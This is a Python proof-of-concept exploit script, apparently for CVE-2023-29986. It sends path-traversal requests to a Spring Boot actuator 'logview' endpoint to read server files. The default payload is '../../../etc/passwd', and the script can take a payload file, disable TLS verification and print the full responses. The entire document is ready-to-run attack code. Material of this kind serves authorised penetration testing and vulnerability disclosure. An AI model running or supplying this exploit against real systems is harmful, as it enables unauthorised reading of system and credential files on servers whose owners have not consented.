#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author: David Espejo (Fortytwo Security)
import requests
import argparse
from urllib.parse import urljoin

def exploit_spring_boot_actuator(target_url, proxy_url, payload_file=None):
    endpoint = "actuator/logview"
    
    # Proxy settings
    proxies = {
        "http": proxy_url,
        "https": proxy_url
    }
    
    # Default payload
    default_payload = "../../../etc/passwd"
    
    # Read payloads from file if provided
    payloads = [default_payload]
    if payload_file:
        with open(payload_file, 'r') as f:
            payloads = f.readlines()
    
    # Ensure the base URL ends with a trailing slash
    if not target_url.endswith('/'):
        target_url += '/'
    
    for payload in payloads:
        payload = payload.strip()
        
        # Construct the full URL
        full_url = urljoin(target_url, f"{endpoint}?file={payload}")
        
        try:
            # Send the request
            response = requests.get(full_url, proxies=proxies, verify=False)
            
            # Display the full HTTP response as evidence
            print(f"Full HTTP Response for payload {payload}:\n")
            print(f"HTTP/1.1 {response.status_code} {response.reason}")
            for header, value in response.headers.items():
                print(f"{header}: {value}")
            print("\n")
            print(response.text)
            print("="*50)
        
        except Exception as e:
            print(f"An error occurred with payload {payload}: {e}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PoC for CVE-2023-29986")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://localhost:8080)")
    parser.add_argument("-p", "--proxy", default="http://127.0.0.1:8080", help="Proxy URL (default is http://127.0.0.1:8080)")
    parser.add_argument("-pl", "--payload-file", help="File containing payloads (optional)")
    
    args = parser.parse_args()
    exploit_spring_boot_actuator(args.target, args.proxy, args.payload_file)
